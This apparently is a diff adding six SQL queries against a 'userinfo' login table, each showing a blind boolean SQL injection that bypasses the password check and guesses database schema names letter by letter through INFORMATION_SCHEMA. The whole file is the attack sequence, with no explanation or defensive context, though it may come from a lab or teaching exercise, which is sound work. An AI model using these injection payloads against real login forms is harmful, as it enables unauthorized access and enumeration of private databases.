@@ -1,0 +1,17 @@
+# Query 1
+SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 's%' AND TABLE_SCHEMA != 'information_schema') #'
+
+# Query 2
+SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 't%' AND TABLE_SCHEMA != 'information_schema') #'
+
+# Query 3
+SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'u%' AND TABLE_SCHEMA != 'information_schema') #'
+
+# Query 4
+SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tt%' AND TABLE_SCHEMA != 'information_schema') #'
+
+# Query 5
+SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tz%' AND TABLE_SCHEMA != 'information_schema') #'
+
+# Query 6
+SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tu%' AND TABLE_SCHEMA != 'information_schema') #'
